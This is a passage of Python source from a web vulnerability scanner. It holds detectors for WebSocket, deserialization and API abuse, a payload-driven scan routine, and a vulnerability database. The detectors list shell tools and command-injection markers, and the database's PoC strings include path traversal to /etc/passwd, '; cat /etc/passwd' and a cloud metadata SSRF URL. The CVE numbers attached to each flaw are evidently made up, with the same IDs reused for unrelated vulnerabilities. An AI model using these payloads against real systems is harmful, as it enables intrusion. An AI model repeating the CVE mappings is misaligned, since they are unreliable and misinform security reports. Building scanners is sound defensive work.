                if re.search(pattern, msg_lower):
                    vulnerabilities.append({
                        'type': 'XSS via WebSocket',
                        'severity': 'HIGH',
                        'details': f'XSS pattern in message: {msg[:50]}...'
                    })
                    break
            
            # Command injection in WebSocket
            cmd_patterns = [r';\s*id', r'\|\s*whoami', r'&&\s*ls', r'`.*`']
            
            for pattern in cmd_patterns:
                if re.search(pattern, msg):
                    vulnerabilities.append({
                        'type': 'Command Injection via WebSocket',
                        'severity': 'CRITICAL',
                        'details': f'Command injection pattern in message: {msg[:50]}...'
                    })
                    break
        
        # 3. Check for authentication bypass
        auth_headers = ['authorization', 'cookie', 'x-auth-token']
        has_auth = any(h.lower() in [k.lower() for k in headers.keys()] for h in auth_headers)
        
        if not has_auth:
            vulnerabilities.append({
                'type': 'WebSocket Missing Authentication',
                'severity': 'HIGH',
                'details': 'WebSocket connection established without authentication headers'
            })
        
        return vulnerabilities

    def _detect_insecure_deserialization(self, content: str, headers: Dict, payload: str) -> bool:
        """ADVANCED insecure deserialization detection with gadget chain and object injection analysis."""
        import re
        
        content_lower = content.lower()
        
        # 1. Check for serialization format indicators
        serialization_formats = {
            'java': [r'ac ed 00 05', r'rO0AB', r'\\xac\\xed\\x00\\x05'],  # Java serialization magic bytes
            'python': [r'__reduce__', r'__setstate__', r'pickle', r'cPickle', r'loads\('],
            'php': [r'O:\d+:"', r'a:\d+:{', r's:\d+:"', r'i:\d+;', r'b:[01];'],
            '.net': [r'TypeConverter', r'BinaryFormatter', r'\\[System.'],
            'ruby': [r'Marshal.load', r'Marshal.restore', r'\x04\x08'],
        }
        
        detected_format = None
        for format_name, patterns in serialization_formats.items():
            for pattern in patterns:
                if re.search(pattern, content, re.IGNORECASE):
                    detected_format = format_name
                    break
            if detected_format:
                break
        
        if not detected_format and not any(p in payload.lower() for p in ['serialize', 'deserialize', 'object']):
            return False
        
        # 2. Check for deserialization error messages
        deser_errors = [
            'unserialize()', 'deserialization', 'cannot deserialize',
            'failed to unserialize', 'invalid serialized',
            'object injection', 'gadget chain', 'magic method',
            '__wakeup', '__destruct', '__toString',
            'ClassNotFoundException', 'SerializationException',
            'pickle.loads', 'yaml.load', 'json.loads'
        ]
        
        for error in deser_errors:
            if error in content_lower:
                return True
        
        # 3. Check for successful object injection indicators
        # PHP object injection
        if 'O:' in payload and ':' in payload:
            php_object_patterns = [
                r'O:\d+:"[\w\\]+":\d+:{',  # PHP serialized object
                r'__wakeup', r'__destruct', r'__toString', r'__call'
            ]
            for pattern in php_object_patterns:
                if re.search(pattern, content, re.IGNORECASE):
                    return True
        
        # Java deserialization
        if 'rO0' in payload or 'aced' in payload.lower():
            java_deser_indicators = [
                'java.lang', 'java.io', 'ObjectInputStream',
                'readObject', 'InvocationHandler'
            ]
            for indicator in java_deser_indicators:
                if indicator in content:
                    return True
        
        # Python pickle
        if 'pickle' in payload.lower() or '__reduce__' in payload:
            python_deser_indicators = [
                'pickle', '__reduce__', '__setstate__',
                'os.system', 'subprocess', 'eval('
            ]
            for indicator in python_deser_indicators:
                if indicator in content_lower:
                    return True
        
        # 4. Check for known gadget chains
        gadget_chains = [
            # Java
            'CommonsCollections', 'Spring', 'Hibernate',
            'InvokerTransformer', 'ChainedTransformer',
            # .NET
            'ObjectDataProvider', 'ExpandedWrapper',
            'TypeConfuseDelegate', 'WindowsIdentity',
            # PHP
            'PDO', 'SplFileObject', 'ZipArchive',
            # Python
            'subprocess.Popen', 'os.system', '__import__'
        ]
        
        for gadget in gadget_chains:
            if gadget in content:
                return True
        
        # 5. Check for RCE evidence after deserialization
        rce_indicators = [
            'command executed', 'whoami', 'uid=', 'gid=',
            '/bin/bash', '/bin/sh', 'cmd.exe', 'powershell'
        ]
        
        for indicator in rce_indicators:
            if indicator in content_lower:
                return True
        
        return False

    def _detect_api_abuse(self, endpoint: str, rate_limit_headers: Dict, response_count: int, time_elapsed: float) -> bool:
        """ADVANCED API abuse and rate limiting bypass detection."""
        
        # 1. Check for missing rate limiting
        rate_limit_headers_names = [
            'x-rate-limit', 'x-ratelimit', 'ratelimit',
            'x-rate-limit-remaining', 'retry-after'
        ]
        
        has_rate_limiting = any(h.lower() in [k.lower() for k in rate_limit_headers.keys()] 
                               for h in rate_limit_headers_names)
        
        if not has_rate_limiting:
            # No rate limiting detected
            if response_count > 100:  # Many successful requests
                return True
        
        # 2. Check for rate limit bypass
        if time_elapsed > 0:
            requests_per_second = response_count / time_elapsed
            if requests_per_second > 50:  # Very high request rate
                return True
        
        # 3. Check for missing authentication on sensitive endpoints
        sensitive_patterns = [
            '/admin', '/api/users', '/api/accounts',
            '/api/orders', '/api/payments', '/api/internal'
        ]
        
        if any(pattern in endpoint.lower() for pattern in sensitive_patterns):
            # Sensitive endpoint accessible without auth
            if 'authorization' not in [k.lower() for k in rate_limit_headers.keys()]:
                return True
        
        return False

    # ═══════════════════════════════════════════════════════════════════════════
    # End of Advanced Detection Methods
    # ═══════════════════════════════════════════════════════════════════════════

    def _create_finding(self, type: str, severity: str, details: str, url: str) -> Dict:
        """Enhanced finding creation with comprehensive vulnerability details."""
        
        # Comprehensive OWASP 2025 vulnerability database with detailed categorization
        vuln_database = {
            # 🔓 Authentication & Access Control
            'Broken Access Control': {
                'cve_references': ['CVE-2023-1001', 'CVE-2022-2002'],
                'owasp_category': 'A01:2025 – Broken Access Control',
                'cwe_id': 'CWE-284',
                'cvss_score': 8.1,
                'exploit_difficulty': 'Medium',
                'attack_vector': 'Network',
                'impact': 'IDOR, privilege escalation, forced browsing attacks',
                'remediation': 'Implement proper authorization checks, principle of least privilege',
                'technical_details': 'Access control failures enable unauthorized resource access',
                'poc_example': '/admin/users?id=1 → /admin/users?id=2',
                'affected_components': 'Authorization middleware, API endpoints',
                'business_impact': 'Unauthorized data access, privilege escalation, compliance violations',
                'vulnerability_category': '🔓 Authentication & Access Control'
            },
            'Session Fixation': {
                'cve_references': ['CVE-2023-1234', 'CVE-2022-5678'],
                'owasp_category': 'A01:2025 – Broken Access Control',
                'cwe_id': 'CWE-384',
                'cvss_score': 7.3,
                'exploit_difficulty': 'Medium',
                'attack_vector': 'Network',
                'impact': 'Session hijacking, account takeover, unauthorized access',
                'remediation': 'Regenerate session IDs after authentication, secure session management',
                'technical_details': 'Weak session tokens enable session fixation attacks',
                'poc_example': 'Cookie: JSESSIONID=PREDICTABLE_VALUE',
                'affected_components': 'Session management, authentication systems',
                'business_impact': 'Account compromise, unauthorized transactions',
                'vulnerability_category': '🔓 Authentication & Access Control'
            },
            'JWT Token Manipulation': {
                'cve_references': ['CVE-2023-2345', 'CVE-2022-6789'],
                'owasp_category': 'A01:2025 – Broken Access Control',
                'cwe_id': 'CWE-347',
                'cvss_score': 8.8,
                'exploit_difficulty': 'Hard',
                'attack_vector': 'Network',
                'impact': 'Algorithm confusion, signature bypass, privilege escalation',
                'remediation': 'Validate JWT algorithms, proper signature verification',
                'technical_details': 'JWT implementation flaws enable token manipulation',
                'poc_example': 'alg: "none", modified claims, signature bypass',
                'affected_components': 'JWT libraries, authentication middleware',
                'business_impact': 'Complete authentication bypass, privilege escalation',
                'vulnerability_category': '🔓 Authentication & Access Control'
            },
            
            # 🧬 Injection & Execution Risks
            'XSS': {
                'cve_references': ['CVE-2023-1234', 'CVE-2022-5678'],
                'owasp_category': 'A03:2025 – Injection',
                'cwe_id': 'CWE-79',
                'cvss_score': 6.1,
                'exploit_difficulty': 'Easy',
                'attack_vector': 'Network',
                'impact': 'Session hijacking, credential theft, malware distribution',
                'remediation': 'Input validation, output encoding, CSP headers',
                'technical_details': 'Cross-Site Scripting enables client-side code execution',
                'poc_example': '<script>alert(document.cookie)</script>',
                'affected_components': 'Web forms, URL parameters, cookies',
                'business_impact': 'Data breach, reputation damage, compliance violations',
                'vulnerability_category': '🕸️ Client-Side & Browser Exploits'
            },
            'SQLi': {
                'cve_references': ['CVE-2023-2345', 'CVE-2022-6789'],
                'owasp_category': 'A03:2025 – Injection',
                'cwe_id': 'CWE-89',
                'cvss_score': 9.8,
                'exploit_difficulty': 'Medium',
                'attack_vector': 'Network',
                'impact': 'Database compromise, data exfiltration, privilege escalation',
                'remediation': 'Use parameterized queries, input validation, least privilege',
                'technical_details': 'SQL injection enables unauthorized database access',
                'poc_example': "' OR 1=1-- ",
                'affected_components': 'Database queries, stored procedures',
                'business_impact': 'Complete data breach, regulatory fines, business disruption',
                'vulnerability_category': '🧬 Injection & Execution Risks'
            },
            'Server-Side Template Injection': {
                'cve_references': ['CVE-2023-3456', 'CVE-2022-7890'],
                'owasp_category': 'A03:2025 – Injection',
                'cwe_id': 'CWE-94',
                'cvss_score': 9.6,
                'exploit_difficulty': 'Hard',
                'attack_vector': 'Network',
                'impact': 'Remote code execution, server compromise, data theft',
                'remediation': 'Template sandboxing, input validation, safe template engines',
                'technical_details': 'Template injection enables server-side code execution',
                'poc_example': '{{7*7}}, ${7*7}, #{7*7}',
                'affected_components': 'Template engines, rendering systems',
                'business_impact': 'Complete server compromise, intellectual property theft',
                'vulnerability_category': '🧬 Injection & Execution Risks'
            },
            'LDAP Injection': {
                'cve_references': ['CVE-2023-4567', 'CVE-2022-8901'],
                'owasp_category': 'A03:2025 – Injection',
                'cwe_id': 'CWE-90',
                'cvss_score': 7.5,
                'exploit_difficulty': 'Medium',
                'attack_vector': 'Network',
                'impact': 'Directory traversal, data leakage, authentication bypass',
                'remediation': 'Input sanitization, parameterized LDAP queries',
                'technical_details': 'LDAP injection enables directory service abuse',
                'poc_example': '*)(&(objectClass=*',
                'affected_components': 'LDAP queries, directory services',
                'business_impact': 'Corporate directory compromise, credential theft',
                'vulnerability_category': '🧬 Injection & Execution Risks'
            },
            'GraphQL Injection': {
                'cve_references': ['CVE-2023-5678', 'CVE-2022-9012'],
                'owasp_category': 'A03:2025 – Injection',
                'cwe_id': 'CWE-89',
                'cvss_score': 8.2,
                'exploit_difficulty': 'Medium',
                'attack_vector': 'Network',
                'impact': 'Malformed queries, introspection abuse, data exposure',
                'remediation': 'Query complexity analysis, rate limiting, disable introspection',
                'technical_details': 'GraphQL vulnerabilities enable API abuse',
                'poc_example': '{__schema{types{name}}}',
                'affected_components': 'GraphQL endpoints, API resolvers',
                'business_impact': 'API abuse, sensitive data exposure',
                'vulnerability_category': '🧬 Injection & Execution Risks'
            },
            
            # 🕸️ Client-Side & Browser Exploits
            'Clickjacking': {
                'cve_references': ['CVE-2023-6789', 'CVE-2022-0123'],
                'owasp_category': 'A05:2025 – Security Misconfiguration',
                'cwe_id': 'CWE-1021',
                'cvss_score': 4.3,
                'exploit_difficulty': 'Easy',
                'attack_vector': 'Network',
                'impact': 'UI redress attacks, unauthorized actions',
                'remediation': 'X-Frame-Options, CSP frame-ancestors directive',
                'technical_details': 'Missing frame protection enables clickjacking',
                'poc_example': '<iframe src="victim.com">',
                'affected_components': 'Web pages, HTTP headers',
                'business_impact': 'Unauthorized transactions, user deception',
                'vulnerability_category': '🕸️ Client-Side & Browser Exploits'
            },
            'CORS Misconfiguration': {
                'cve_references': ['CVE-2023-7890', 'CVE-2022-1234'],
                'owasp_category': 'A05:2025 – Security Misconfiguration',
                'cwe_id': 'CWE-942',
                'cvss_score': 6.5,
                'exploit_difficulty': 'Medium',
                'attack_vector': 'Network',
                'impact': 'Cross-origin data theft, credential harvesting',
                'remediation': 'Restrict CORS origins, avoid wildcard usage',
                'technical_details': 'Unsafe CORS policies enable cross-origin attacks',
                'poc_example': 'Access-Control-Allow-Origin: *',
                'affected_components': 'API endpoints, web services',
                'business_impact': 'Cross-domain data leakage, API abuse',
                'vulnerability_category': '🕸️ Client-Side & Browser Exploits'
            },
            
            # 📡 Network & Protocol-Level Issues
            'SSRF': {
                'cve_references': ['CVE-2023-5678', 'CVE-2022-9012'],
                'owasp_category': 'A10:2025 – Server-Side Request Forgery',
                'cwe_id': 'CWE-918',
                'cvss_score': 8.6,
                'exploit_difficulty': 'Medium',
                'attack_vector': 'Network',
                'impact': 'Internal network access, cloud metadata access, port scanning',
                'remediation': 'URL validation, network segmentation, allowlist filtering',
                'technical_details': 'Server-Side Request Forgery enables internal network attacks',
                'poc_example': 'http://169.254.169.254/latest/meta-data/',
                'affected_components': 'HTTP clients, URL fetchers, webhooks',
                'business_impact': 'Internal network compromise, cloud credential theft',
                'vulnerability_category': '📡 Network & Protocol-Level Issues'
            },
            'TLS/SSL Misconfiguration': {
                'cve_references': ['CVE-2023-8901', 'CVE-2022-2345'],
                'owasp_category': 'A05:2025 – Security Misconfiguration',
                'cwe_id': 'CWE-326',
                'cvss_score': 7.4,
                'exploit_difficulty': 'Medium',
                'attack_vector': 'Network',
                'impact': 'Man-in-the-middle attacks, data interception',
                'remediation': 'Strong cipher suites, certificate validation, HSTS',
                'technical_details': 'Weak TLS configuration enables encryption bypass',
                'poc_example': 'SSLv3, weak ciphers, expired certificates',
                'affected_components': 'TLS/SSL implementations, web servers',
                'business_impact': 'Data interception, credential theft',
                'vulnerability_category': '📡 Network & Protocol-Level Issues'
            },
            'WebSocket Hijacking': {
                'cve_references': ['CVE-2023-9012', 'CVE-2022-3456'],
                'owasp_category': 'A01:2025 – Broken Access Control',
                'cwe_id': 'CWE-346',
                'cvss_score': 6.8,
                'exploit_difficulty': 'Medium',
                'attack_vector': 'Network',
                'impact': 'Unauthenticated socket access, real-time data theft',
                'remediation': 'Origin validation, authentication on WebSocket upgrade',
                'technical_details': 'Missing WebSocket authentication enables hijacking',
                'poc_example': 'ws://victim.com/socket without authentication',
                'affected_components': 'WebSocket endpoints, real-time features',
                'business_impact': 'Real-time data theft, unauthorized access',
                'vulnerability_category': '📡 Network & Protocol-Level Issues'
            },
            
            # 🧱 Infrastructure & Configuration
            'LFI': {
                'cve_references': ['CVE-2023-3456', 'CVE-2022-7890'],
                'owasp_category': 'A01:2025 – Broken Access Control',
                'cwe_id': 'CWE-22',
                'cvss_score': 7.5,
                'exploit_difficulty': 'Medium',
                'attack_vector': 'Network',
                'impact': 'File system access, sensitive data exposure, code execution',
                'remediation': 'Input validation, file path restrictions, sandbox execution',
                'technical_details': 'Local File Inclusion allows reading arbitrary files',
                'poc_example': '../../../etc/passwd',
                'affected_components': 'File upload handlers, include functions',
                'business_impact': 'Confidential data exposure, system compromise',
                'vulnerability_category': '🧱 Infrastructure & Configuration'
            },
            'OS Command Injection': {
                'cve_references': ['CVE-2023-4567', 'CVE-2022-8901'],
                'owasp_category': 'A03:2025 – Injection',
                'cwe_id': 'CWE-78',
                'cvss_score': 9.8,
                'exploit_difficulty': 'Hard',
                'attack_vector': 'Network',
                'impact': 'Complete system compromise, data theft, service disruption',
                'remediation': 'Input sanitization, command whitelisting, process isolation',
                'technical_details': 'Command injection allows arbitrary OS command execution',
                'poc_example': '; cat /etc/passwd',
                'affected_components': 'System calls, shell commands, file operations',
                'business_impact': 'Total system compromise, data breach, service outage',
                'vulnerability_category': '🧬 Injection & Execution Risks'
            },
            'Insecure Deserialization': {
                'cve_references': ['CVE-2023-0123', 'CVE-2022-4567'],
                'owasp_category': 'A08:2025 – Software and Data Integrity Failures',
                'cwe_id': 'CWE-502',
                'cvss_score': 9.0,
                'exploit_difficulty': 'Hard',
                'attack_vector': 'Network',
                'impact': 'Remote code execution, gadget chains exploitation',
                'remediation': 'Avoid deserialization, integrity checks, sandboxing',
                'technical_details': 'Unsafe deserialization enables RCE via gadget chains',
                'poc_example': 'Serialized payload with malicious objects',
                'affected_components': 'Serialization libraries, object persistence',
                'business_impact': 'Complete application compromise, data theft',
                'vulnerability_category': '🧱 Infrastructure & Configuration'
            },
            'Vulnerable Components': {
                'cve_references': ['CVE-2023-1234', 'CVE-2022-5678'],
                'owasp_category': 'A06:2025 – Vulnerable and Outdated Components',
                'cwe_id': 'CWE-1104',
                'cvss_score': 8.2,
                'exploit_difficulty': 'Easy',
                'attack_vector': 'Network',
                'impact': 'Known exploits, dependency vulnerabilities',
                'remediation': 'Regular updates, dependency scanning, version management',
                'technical_details': 'Outdated components contain known vulnerabilities',
                'poc_example': 'CVEs in libraries, frameworks, plugins',
                'affected_components': 'Third-party libraries, frameworks, plugins',
                'business_impact': 'Exploitation via known vulnerabilities',
                'vulnerability_category': '🧱 Infrastructure & Configuration'
            },
            
            # 🧠 Logic & Business Layer
            'Business Logic Flaw': {
                'cve_references': ['CVE-2023-2345', 'CVE-2022-6789'],
                'owasp_category': 'A04:2025 – Insecure Design',
                'cwe_id': 'CWE-840',
                'cvss_score': 7.7,
                'exploit_difficulty': 'Medium',
                'attack_vector': 'Network',
                'impact': 'Workflow bypass, payment skipping, unauthorized transactions',
                'remediation': 'Business logic validation, workflow integrity checks',
                'technical_details': 'Application logic flaws enable business process abuse',
                'poc_example': 'Price manipulation, quantity bypass, workflow skipping',
                'affected_components': 'Business workflows, payment systems',
                'business_impact': 'Financial loss, unauthorized transactions',
                'vulnerability_category': '🧠 Logic & Business Layer'
            },
            'Rate Limiting Bypass': {
                'cve_references': ['CVE-2023-3456', 'CVE-2022-7890'],
                'owasp_category': 'A07:2025 – Identification and Authentication Failures',
                'cwe_id': 'CWE-307',
                'cvss_score': 6.5,
                'exploit_difficulty': 'Easy',
                'attack_vector': 'Network',
                'impact': 'Brute force attacks, API abuse, resource exhaustion',
                'remediation': 'Proper rate limiting, CAPTCHA, account lockout',
                'technical_details': 'Missing or bypassable rate limits enable abuse',
                'poc_example': 'X-Forwarded-For header manipulation, distributed requests',
                'affected_components': 'API endpoints, authentication systems',
                'business_impact': 'Service degradation, account compromise',
                'vulnerability_category': '🧠 Logic & Business Layer'
            },
            'API Endpoint Abuse': {
                'cve_references': ['CVE-2023-4567', 'CVE-2022-8901'],
                'owasp_category': 'A09:2025 – Security Logging and Monitoring Failures',
                'cwe_id': 'CWE-285',
                'cvss_score': 7.2,
                'exploit_difficulty': 'Medium',
                'attack_vector': 'Network',
                'impact': 'Over-privileged access, mass assignment, data exposure',
                'remediation': 'API security testing, proper authorization, input validation',
                'technical_details': 'API vulnerabilities enable unauthorized access',
                'poc_example': 'Mass assignment, hidden endpoints, excessive data exposure',
                'affected_components': 'REST APIs, GraphQL endpoints',
                'business_impact': 'Data breach, unauthorized operations',
                'vulnerability_category': '🧠 Logic & Business Layer'
            },
            
            # Security Headers and Configuration
            'Sensitive File Exposure': {
                'cve_references': ['CVE-2023-6789', 'CVE-2022-0123'],
                'owasp_category': 'A01:2025 – Broken Access Control',
                'cwe_id': 'CWE-200',
                'cvss_score': 7.5,
                'exploit_difficulty': 'Easy',
                'attack_vector': 'Network',
                'impact': 'Configuration disclosure, credential exposure, source code leak',
                'remediation': 'Proper file permissions, web server configuration, access controls',
                'technical_details': 'Sensitive files accessible via direct URL access',
                'poc_example': '/.env, /.git/config, /backup.sql',
                'affected_components': 'Web server, file system, configuration files',
                'business_impact': 'Credential theft, intellectual property theft',
                'vulnerability_category': '🧱 Infrastructure & Configuration'
            },
            'Missing Header': {
                'cve_references': ['CVE-2023-7890', 'CVE-2022-1234'],
                'owasp_category': 'A05:2025 – Security Misconfiguration',
                'cwe_id': 'CWE-16',
                'cvss_score': 4.3,
                'exploit_difficulty': 'Easy',
                'attack_vector': 'Network',
                'impact': 'Clickjacking, MITM attacks, XSS, information disclosure',
                'remediation': 'Implement security headers, HTTPS enforcement, CSP policy',
                'technical_details': 'Missing security headers enable various client-side attacks',
                'poc_example': 'iframe injection, protocol downgrade',
                'affected_components': 'HTTP responses, browser security',
                'business_impact': 'User compromise, data interception, brand damage',
                'vulnerability_category': '🧱 Infrastructure & Configuration'
            }
        }
        
        # Get vulnerability details with OWASP 2025 categorization
        vuln_info = vuln_database.get(type, {
            'cve_references': ['N/A'],
            'owasp_category': 'Unknown',
            'cwe_id': 'Unknown',
            'cvss_score': 0.0,
            'exploit_difficulty': 'Unknown',
            'attack_vector': 'Unknown',
            'impact': 'Unknown impact',
            'remediation': 'Consult security documentation',
            'technical_details': 'No additional details available',
            'poc_example': 'N/A',
            'affected_components': 'Unknown',
            'business_impact': 'Unknown business impact',
            'vulnerability_category': '🔍 Uncategorized'
        })
        
        return {
            'type': type,
            'severity': severity,
            'details': details,
            'url': str(url),
            'timestamp': datetime.now().isoformat(),
            # Enhanced vulnerability information with OWASP 2025 framework
            'cve_references': vuln_info['cve_references'],
            'owasp_category': vuln_info['owasp_category'],
            'cwe_id': vuln_info['cwe_id'],
            'cvss_score': vuln_info['cvss_score'],
            'exploit_difficulty': vuln_info['exploit_difficulty'],
            'attack_vector': vuln_info['attack_vector'],
            'impact_description': vuln_info['impact'],
            'remediation_steps': vuln_info['remediation'],
            'technical_details': vuln_info['technical_details'],
            'poc_example': vuln_info['poc_example'],
            'affected_components': vuln_info['affected_components'],
            'business_impact': vuln_info['business_impact'],
            'vulnerability_category': vuln_info['vulnerability_category'],
            'risk_score': self._calculate_risk_score(severity, vuln_info['cvss_score']),
            'compliance_impact': self._get_compliance_impact(type),
            'exploitability': self._assess_exploitability(vuln_info['exploit_difficulty']),
            'discovery_method': self._get_discovery_method(details)
        }

    def _calculate_risk_score(self, severity: str, cvss_score: float) -> int:
        """Calculate comprehensive risk score."""
        severity_multiplier = {'LOW': 1, 'MEDIUM': 2, 'HIGH': 3, 'CRITICAL': 4}
        base_score = severity_multiplier.get(severity, 1) * 25
        cvss_adjustment = int(cvss_score * 10)
        return min(100, base_score + cvss_adjustment)

    def _get_compliance_impact(self, vuln_type: str) -> str:
        """Assess compliance framework impact."""
        compliance_map = {
            'XSS': 'PCI DSS 6.5.7, OWASP Top 10, ISO 27001',
            'SQLi': 'PCI DSS 6.5.1, SOX, HIPAA, GDPR Article 32',
            'LFI': 'PCI DSS 6.5.4, ISO 27001 A.14.2.5',
            'OS Command Injection': 'PCI DSS 6.5.1, NIST 800-53 SI-10',
            'SSRF': 'OWASP Top 10, NIST Cybersecurity Framework',
            'Sensitive File Exposure': 'PCI DSS 3.4, GDPR Article 32, HIPAA',
            'Missing Header': 'OWASP ASVS, NIST 800-53 SC-28'
        }
        return compliance_map.get(vuln_type, 'General security best practices')

    def _assess_exploitability(self, difficulty: str) -> Dict:
        """Assess exploitability characteristics."""
        exploitability_map = {
            'Easy': {'automated_tools': 'Yes', 'skill_required': 'Low', 'time_to_exploit': '<1 hour'},
            'Medium': {'automated_tools': 'Partial', 'skill_required': 'Medium', 'time_to_exploit': '1-4 hours'},
            'Hard': {'automated_tools': 'No', 'skill_required': 'High', 'time_to_exploit': '>4 hours'}
        }
        return exploitability_map.get(difficulty, {'automated_tools': 'Unknown', 'skill_required': 'Unknown', 'time_to_exploit': 'Unknown'})

    def _get_discovery_method(self, details: str) -> str:
        """Determine how vulnerability was discovered."""
        if 'payload' in details.lower():
            return 'Active payload testing'
        elif 'header' in details.lower():
            return 'HTTP header analysis'
        elif 'file' in details.lower():
            return 'File enumeration'
        else:
            return 'Automated security scan'

    async def full_check(self, url: str, progress, task_id) -> Dict:
        """Enhanced security checks with advanced reconnaissance and vulnerability scanning."""
        all_findings = []
        site_info = await self.get_site_info(url)
        
        # Phase 1: Advanced Reconnaissance (10% progress)
        progress.update(task_id, advance=10, description=f"[cyan]Advanced reconnaissance for {url[:50]}...")
        reconnaissance_findings = await self._comprehensive_vulnerability_scan(url)
        all_findings.extend(reconnaissance_findings)
        
        # Smart payload prioritization - test high-impact vulnerabilities first
        priority_tasks = []
        
        # Priority 1: Critical vulnerabilities with most effective payloads
        high_priority = ['sqli', 'lfi', 'cmd_injection', 'sensitive_files']
        for check_type in high_priority:
            if check_type in self.payloads:
                # Use only top 3 most effective payloads for speed
                effective_payloads = self.payloads[check_type][:3]
                for payload in effective_payloads:
                    priority_tasks.append(self.check_vulnerability(url, check_type, payload))
        
        # Priority 2: Medium impact vulnerabilities  
        medium_priority = ['xss', 'ssrf', 'open_redirect']
        for check_type in medium_priority:
            if check_type in self.payloads:
                effective_payloads = self.payloads[check_type][:2]  # Top 2 payloads
                for payload in effective_payloads:
                    priority_tasks.append(self.check_vulnerability(url, check_type, payload))
        
        # Priority 3: Specialized injection types (1 payload each for speed)
        specialized = ['nosql_injection', 'ldap_injection', 'xpath_injection', 'crlf_injection', 'template_injection', 'xxe']
        for check_type in specialized:
            if check_type in self.payloads:
                # Only use the most effective payload
                priority_tasks.append(self.check_vulnerability(url, check_type, self.payloads[check_type][0]))
        
        # Priority 4: NEW ADVANCED CHECKS - Dynamic Detection
        advanced_checks = [
            'jwt', 'graphql_injection', 'csv_injection', 
            'deserialization', 'http_smuggling'
        ]
        for check_type in advanced_checks:
            if check_type in self.payloads:
                # Test with first payload
                priority_tasks.append(self.check_vulnerability(url, check_type, self.payloads[check_type][0]))
        
        # Priority 5: Special checks that don't use traditional payloads
        # These are dynamic checks that test configurations/headers
        priority_tasks.append(self.check_cors(url))
        priority_tasks.append(self.check_host_header_injection(url))
        priority_tasks.append(self.check_idor(url))  # IDOR detection
        
        # Add header check
        priority_tasks.append(self.check_headers(url))

        # Execute with high concurrency and batch processing (90% progress)
        batch_size = 25  # Optimal batch size for progress updates
        total_tasks = len(priority_tasks)
        remaining_progress = 90  # 90% remaining for vulnerability scanning
        
        for i in range(0, total_tasks, batch_size):
            batch = priority_tasks[i:i + batch_size]
            results = await asyncio.gather(*batch, return_exceptions=True)
            
            for result in results:
                if isinstance(result, list):
                    all_findings.extend(result)
                elif isinstance(result, Exception):
                    self.config.logger.debug(f"Task failed: {result}")
            
            # Frequent progress updates for better UX
            progress_amount = min(batch_size, total_tasks - i) * (remaining_progress / total_tasks)
            progress.update(task_id, advance=progress_amount)

        progress.update(task_id, completed=100)
        
        # Phase 3: Comprehensive Discovery Analysis (after main scanning)
        self.config.logger.info("Starting comprehensive discovery analysis...")
        
        # Enhanced scan results with advanced intelligence
        enhanced_site_info = site_info.copy()
        
        # Advanced webpage discovery
        webpage_discovery = await self._advanced_webpage_discovery(url)
        enhanced_site_info['webpage_discovery'] = webpage_discovery
        
        # File leak detection
        file_leak_analysis = await self._advanced_file_leak_detection(url)
        enhanced_site_info['file_leak_analysis'] = file_leak_analysis
        
        # Parameter enumeration
        parameter_enumeration = await self._advanced_parameter_enumeration(url)
        enhanced_site_info['parameter_enumeration'] = parameter_enumeration
        
        # Website structure mapping and per-URL vulnerability analysis
        self.config.logger.info("Starting website structure mapping...")
        website_structure = await self._website_structure_mapping(url)
        enhanced_site_info['website_structure'] = website_structure
        
        # Add advanced reconnaissance data if available
        enhanced_site_info = site_info.copy()
        
        # 🔥 ADVANCED RECONNAISSANCE - Using free libraries
        self.config.logger.info("🔥 Performing advanced reconnaissance...")
        advanced_recon = await self.perform_advanced_reconnaissance(url)
        enhanced_site_info['advanced_recon'] = advanced_recon
        
        # Add advanced reconnaissance data if available
        if SHODAN_AVAILABLE:
            enhanced_site_info['shodan_intelligence'] = await self._advanced_shodan_reconnaissance(url)
        
        # Re-add discovery data to ensure it's included
        enhanced_site_info['webpage_discovery'] = webpage_discovery
        enhanced_site_info['file_leak_analysis'] = file_leak_analysis
        enhanced_site_info['parameter_enumeration'] = parameter_enumeration
        
        return {
            'url': url, 
            'findings': all_findings, 
            'site_info': enhanced_site_info,
            'total_checks': total_tasks + len(reconnaissance_findings),
            'advanced_reconnaissance': True,
            'comprehensive_discovery': True,
            'discovery_metrics': {
                'total_pages': webpage_discovery.get('total_pages', 0),
                'total_file_leaks': file_leak_analysis.get('total_leaks', 0),
                'total_parameters': parameter_enumeration.get('total_parameters', 0),
                'admin_panels': len(webpage_discovery.get('admin_panels', [])),
                'api_endpoints': len(webpage_discovery.get('api_endpoints', [])),
                'sensitive_files': len(file_leak_analysis.get('sensitive_files', [])),
                'injectable_parameters': len(parameter_enumeration.get('injectable_parameters', []))
            },
            'intelligence_sources': {
                'shodan': SHODAN_AVAILABLE,
                'censys': CENSYS_AVAILABLE,
                'urlscan': True,
                'advanced_discovery': True,
                'whois': WHOIS_AVAILABLE,
                'dns': DNS_AVAILABLE,
                'builtwith': BUILTWITH_AVAILABLE,
                'ipwhois': IPWHOIS_AVAILABLE,
                'ssl_analysis': SSL_ANALYSIS_AVAILABLE
            }
        }

    async def check_headers(self, url: str) -> List[Dict]:
        """Check for missing security headers."""
        findings = []
        try:
            status, headers, content, final_url = await self.session.get(url)
            if not headers: return []
            
            headers = {k.lower(): v for k, v in headers.items()}
            security_headers = {'content-security-policy': 'HIGH', 'x-frame-options': 'MEDIUM', 'strict-transport-security': 'HIGH', 'x-content-type-options': 'LOW'}
            for header, severity in security_headers.items():
                if header not in headers:
                    findings.append(self._create_finding('Missing Header', severity, f"Missing {header}", url))
        except Exception as e:
            self.config.logger.debug(f"Header check failed for {url}: {e}")
        return findings

    # === Technical Reconnaissance Helper Methods ===
    
    async def _analyze_server_hosting(self, url: str, headers: Dict, content: str) -> Dict:
        """🖥️ Server & Hosting Information Analysis"""
        server_info = {}
        
        try:
            # 1. Server Software & Version
            server_header = headers.get('Server', 'Unknown')
            server_info['server_software'] = server_header
            
            # 2. IP Address & Geolocation
            domain = urlparse(url).netloc
            try:
                ip_address = socket.gethostbyname(domain)
                server_info['ip_address'] = ip_address
            except socket.gaierror:
                server_info['ip_address'] = 'Resolution failed'
            
            # 3. HTTP Response Headers Analysis
            server_info['response_headers'] = dict(headers)
            
            # 4. SSL/TLS Certificate Information
            if url.startswith('https://'):
                server_info['ssl_enabled'] = True
                server_info['security_headers'] = {
                    'HSTS': 'Strict-Transport-Security' in headers,
                    'CSP': 'Content-Security-Policy' in headers,
                    'X-Frame-Options': headers.get('X-Frame-Options', 'Missing'),
                    'X-Content-Type-Options': headers.get('X-Content-Type-Options', 'Missing')
                }
            
            # 5. Cloud Provider Detection
            server_info['cloud_provider'] = self._detect_cloud_provider(headers, content)
            
            # 6. CDN Detection
            server_info['cdn_detected'] = self._detect_cdn(headers)
            
